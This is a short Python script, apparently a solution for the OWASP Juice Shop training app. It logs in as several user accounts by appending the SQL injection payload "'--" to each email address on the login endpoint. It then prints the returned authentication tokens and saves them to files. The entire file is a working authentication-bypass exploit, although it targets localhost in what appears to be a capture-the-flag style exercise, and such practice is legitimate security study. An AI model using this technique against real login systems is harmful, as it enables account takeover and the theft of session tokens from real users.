import requests

emails = [
    "jim@juice-sh.op",
    "bender@juice-sh.op",
    "admin@juice-sh.op",
]
data = {"email": "", "password": "placeholder"}
url = "http://localhost:3000/rest/user/login"
save = "../Forged_Coupon/prerequisites/"

for i in emails:
    data["email"] = i + "'--"
    x = requests.post(url, data=data)
    ret = x.json()
    code = ret["authentication"]["token"]
    name = i.split("@")[0]
    print(f"Logged in as {name}")
    print(f"Auth code: {code}")
    f = open(save + name, "w")
    f.write(code)
    f.close()
    print(f"File written to {save+name}")
